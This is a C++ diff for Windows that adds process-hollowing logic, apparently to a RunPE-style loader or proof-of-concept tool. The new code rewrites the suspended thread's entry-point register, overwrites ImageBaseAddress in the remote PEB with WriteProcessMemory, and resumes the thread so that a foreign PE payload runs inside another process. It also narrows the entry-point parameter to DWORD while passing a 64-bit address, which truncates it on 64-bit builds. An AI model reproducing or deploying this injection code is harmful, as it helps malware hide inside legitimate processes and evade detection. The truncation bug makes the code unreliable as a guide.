@@ -56,14 +56,19 @@ bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
     return GetThreadContext(pi.hThread, &context);
 }
 
-bool update_peb_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
+bool update_peb_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, DWORD entry_point_va)
 {
 #if defined(_WIN64)
-    context.Rcx = static_cast<DWORD>(entry_point_va);
+    context.Rcx = entry_point_va;
 #else
-    context.Eax = entry_point;
+    context.Eax = entry_point_va;
 #endif
-    return SetThreadContext(pi.hThread, &context);
+    if (SetThreadContext(pi.hThread, &context)) {
+        return true;
+    }
+    DWORD last_err = GetLastError();
+    printf("last err: %d %x\n", last_err, last_err);
+    return false;
 }
 
 ULONGLONG get_remote_peb_addr(const CONTEXT &context)
@@ -96,6 +101,30 @@ bool is_compatible_payload(BYTE* loaded_pe)
      if (is64bit(loaded_pe)) return false;
      return true;
 #endif
+}
+
+bool redirect_to_payload(BYTE* loaded_pe, PROCESS_INFORMATION &pi, CONTEXT &context)
+{
+    ULONGLONG image_base = get_image_base(loaded_pe);
+    DWORD ep = get_entry_point_rva(loaded_pe);
+    ULONGLONG ep_va = image_base + ep;
+    if (!update_peb_entry_point(pi, context, ep_va)) {
+        printf("Cannot update PEB!\n");
+        return false;
+    }
+    ULONGLONG peb_addr = get_remote_peb_addr(context);
+    PEB* remote_peb = (PEB*) peb_addr;
+    LPVOID remote_img_base = &(remote_peb->ImageBaseAddress);
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
+        &image_base, sizeof(LPVOID), 
+        &written)) 
+    {
+        printf("Cannot update ImageBaseAddress!\n");
+        return false;
+    }
+    return true;
 }
 
 int main(int argc, char *argv[])
@@ -176,7 +205,15 @@ int main(int argc, char *argv[])
         return -1;
     }
     printf("Loaded at: %p\n", loaded_pe);
-    
+
+    if (redirect_to_payload(loaded_pe, pi, context)) {
+        printf("Redirected!\n");
+    } else {
+        printf("Redirecting failed!\n");
+        return -1;
+    }
+    ResumeThread(pi.hThread);
+
     system("pause");
     return 0;
 }
